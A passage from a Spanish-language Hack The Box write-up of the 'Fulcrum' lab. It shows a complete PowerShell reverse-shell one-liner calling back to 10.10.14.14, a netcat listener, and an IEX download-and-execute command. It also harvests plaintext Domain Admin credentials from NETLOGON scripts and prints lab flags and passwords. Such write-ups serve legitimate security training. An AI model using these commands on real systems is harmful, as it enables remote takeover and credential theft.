SourceAddress          :
PingSucceeded          : False
PingReplyDetails (RTT) : 0 ms

```
Vemos que el ping no tiene exito pero sí se nos aplica la resolución de nombres, y se nos muestra la IP '192.168.122.132' correspondiente al dominio file.fulcrum.local.

Ahora vamos a intentar ejecutar una reverse shell para conectarnos al host "FILE" como el usuario "BTables". Podemos usar el script [Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) y modificarlo a nuestras necesidades.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.14',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```
Nos pondremos en escucha por el puerto 53

>> <p style="font-size: 16px;">NOTA: Es posible que la máquina remota tenga reglas de firewall que restrinjan la salida de tráfico en ciertos puertos. Sin embargo, el puerto 53 tiene permitida la salida, ya que se reconoce como un puerto local de confianza</p>

```bash
sudo nc -lnvp 53
```
```
*Evil-WinRM* PS C:\Users\WebUser\Documents> Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/Invoke-PowerShellTcpOneLine.ps1')}
```

```bash
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $sudo nc -lnvp 53

PS C:\Users\BTables\Documents>whoami
fulcrum\btables
PS C:\Users\BTables\Documents> $env:COMPUTERNAME
FILE
PS C:\Users\BTables\documents> gci ../desktop


    Directory: C:\Users\BTables\desktop


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----         5/8/2022   1:48 AM             32 user.txt                                                                                                                                                                                                


PS C:\Users\BTables\documents> gc ../desktop/user.txt
fce52521c8f872b514f037fada78daf4
```
Después de obtener acceso a la máquina "FILE", podemos localizar la flag "user.txt" en el directorio "Desktop" del usuario BTables

Al tiempo de enumerar la máquina "FILES", conseguimos autenticarnos en el recurso compartido NETLOGON
>><p style="font-size: 16px;">Netlogon es un servicio en sistemas operativos Windows que desempeña un papel importante en la autenticación y la autorización en entornos de red basados en dominios. Este servicio es esencial para la operación de un controlador de dominio.</p>

```
PS C:\Users\BTables\Documents> net use n: \\dc.fulcrum.local\netlogon /user:FULCRUM\BTables ++FileServerLogon12345++
The command completed successfully.
PS C:\Users\BTables\Documents> n:
PS N:\> dir


    Directory: N:\


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        2/12/2022  10:34 PM            340 00034421-648d-4835-9b23-c0d315d71ba3.ps1                                                                                                                                                                
-a----        2/12/2022  10:34 PM            340 0003ed3b-31a9-4d8f-a152-a234ecb522d4.ps1                                                                                                                                                                
-a----        2/12/2022  10:34 PM            340 0010183b-2f84-4d4a-9490-b5ae922e3ba1.ps1                                                                                                                                                                
-a----        2/12/2022  10:34 PM            340 001985e5-4b19-426a-96fe-927a972a6fed.ps1                                                                                                                                                                
-a----        2/12/2022  10:34 PM            340 0033f8d7-8ede-4186-83fa-6a17b966f1b9.ps1   

...[SNIP]...
```
## <span style="color: yellow;">Usuario 923a</span>

### <span style="color: blue;">Privilegios de administrador</span>

En el directorio se encuentran varios scripts de PowerShell que contienen información sensible, incluyendo credenciales de usuario. Es posible filtrar e identificar detalles relacionados con usuarios administradores mediante un comando específico
```
PS N:\> Get-ChildItem -Recurse | Select-String -Pattern "admin" -CaseSensitive:$false
PS N:\> Get-ChildItem -Recurse -Filter *.ps1 | ForEach-Object { if (Get-Content $_.FullName -Raw | Select-String "923a") { Get-Content $_.FullName } }
# Map network drive v1.0
$User = '9f68'
$Pass = '@fulcrum_df0923a7ca40_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred


# Map network drive v1.0
$User = '923a'
$Pass = '@fulcrum_bf392748ef4e_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred
```
Encontramos las credenciales del usuario "923a", recordando que pertenece al grupo "Domain Admins". Al crear nuestro objeto PSCredential, podemos autenticarnos y ejecutar comandos en nombre del usuario "923a". Esto nos permite realizar acciones como obtener una reverse shell o volcar archivos directamente

```bash
PS N:\> c:
PS C:\Users\BTables\Documents> $SecPass = ConvertTo-SecureString '@fulcrum_bf392748ef4e_$' -AsPlainText -Force
PS C:\Users\BTables\Documents> $cred = New-Object System.Management.Automation.PSCredential("FULCRUM\923a",$SecPass)
PS C:\Users\BTables\Documents> Invoke-Command -ComputerName dc.fulcrum.local -Credential $cred -ScriptBlock { whoami } 
fulcrum\923a
PS C:\Users\BTables\Documents> Invoke-Command -ComputerName dc.fulcrum.local -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\root.txt" }

8ddbe372e57c019bb6c4cdb5b35a0cab

```
Y logramos conseguir flag root.txt
